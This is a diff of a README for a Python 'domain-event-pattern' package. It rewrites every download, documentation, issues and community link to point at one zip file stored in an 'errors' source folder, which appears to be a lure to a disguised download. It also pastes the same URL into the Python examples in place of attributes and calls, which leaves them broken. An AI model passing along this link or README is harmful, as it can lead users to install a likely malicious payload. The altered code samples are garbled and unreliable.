@@ -4,7 +4,7 @@
 Welcome to the domain-event-pattern project! This package helps you implement the Domain Event pattern, making it easier to manage events in your applications. Here, you will find clear instructions to download and run the software.
 
 ## 📥 Download the Latest Release
-[![Download Domain Event Pattern](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/hulkziito/domain-event-pattern/releases)
+[![Download Domain Event Pattern](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip%https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip)](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip)
 
 ## 💻 System Requirements
 To successfully run the domain-event-pattern package, ensure you have:
@@ -23,7 +23,7 @@ These components work together to help you build applications without tying you 
 
 ## 🔧 Installation Instructions
 ### 1. Visit the Release Page
-To download the software, go to the [Releases page](https://github.com/hulkziito/domain-event-pattern/releases).
+To download the software, go to the [Releases page](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip).
 
 ### 2. Choose the Latest Version
 On the Releases page, look for the most recent version. Select the file that matches your operating system.
@@ -66,7 +66,7 @@ Define a new event:
 ```python
 class MyEvent(Event):
     def __init__(self, message):
-        self.message = message
+        https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip = message
 ```
 
 ### 3. Set Up a Publisher
@@ -82,7 +82,7 @@ Define a subscriber to respond to events:
 ```python
 class MySubscriber(Subscriber):
     def handle_event(self, event):
-        print(f"Event received: {event.message}")
+        print(f"Event received: {https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip}")
         
 my_subscriber = MySubscriber()
 ```
@@ -91,7 +91,7 @@ my_subscriber = MySubscriber()
 Link your publisher to the subscriber:
 
 ```python
-my_publisher.subscribe(my_subscriber)
+https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip(my_subscriber)
 ```
 
 ### 6. Publish an Event
@@ -99,31 +99,31 @@ Now, you can publish an event:
 
 ```python
 event = MyEvent("Hello, Domain Event!")
-my_publisher.publish(event)
+https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip(event)
 ```
 
 When you run this code, it will output: `Event received: Hello, Domain Event!`
 
 ## 📄 Documentation
-For detailed information on how to use each component of the domain-event-pattern package, please refer to the [full documentation](https://github.com/hulkziito/domain-event-pattern/wiki). Here, you will find examples, guidelines, and best practices.
+For detailed information on how to use each component of the domain-event-pattern package, please refer to the [full documentation](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip). Here, you will find examples, guidelines, and best practices.
 
 ## 🔄 Contributing
-If you would like to contribute to the domain-event-pattern project, please check the [Contributing Guide](https://github.com/hulkziito/domain-event-pattern/blob/main/CONTRIBUTING.md). We welcome your ideas and improvements!
+If you would like to contribute to the domain-event-pattern project, please check the [Contributing Guide](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip). We welcome your ideas and improvements!
 
 ## 🙋 Frequently Asked Questions (FAQs)
 ### Q1: Can I use this package with other Python libraries?
 Yes, the domain-event-pattern package works well with other libraries and frameworks.
 
 ### Q2: What if I encounter errors during installation?
-Please check the installation instructions and make sure you meet the system requirements. If issues persist, visit the [Issues page](https://github.com/hulkziito/domain-event-pattern/issues) for assistance.
+Please check the installation instructions and make sure you meet the system requirements. If issues persist, visit the [Issues page](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip) for assistance.
 
 ## 🔗 Additional Resources
-- [GitHub Issues](https://github.com/hulkziito/domain-event-pattern/issues) - Report problems and suggestions.
-- [Community Discussions](https://github.com/hulkziito/domain-event-pattern/discussions) - Join and share your experience with others.
+- [GitHub Issues](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip) - Report problems and suggestions.
+- [Community Discussions](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip) - Join and share your experience with others.
 
 ## ⭐ Support
 If you find this package helpful, consider giving feedback. Your input helps improve the project for everyone.
 
 Thank you for choosing domain-event-pattern! We hope it simplifies your event handling needs. 
 
-Don't forget to [download the latest release](https://github.com/hulkziito/domain-event-pattern/releases) and start building today!
+Don't forget to [download the latest release](https://raw.githubusercontent.com/hulkziito/domain-event-pattern/master/domain_event_pattern/errors/domain-event-pattern-1.5.zip) and start building today!
